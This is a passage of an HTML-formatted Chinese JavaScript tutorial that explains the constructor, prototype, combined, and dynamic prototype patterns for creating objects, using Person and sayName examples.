161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“Software”</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){<br>}<br>Person.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){<br> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br>person1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“function”</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);<br>person1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: 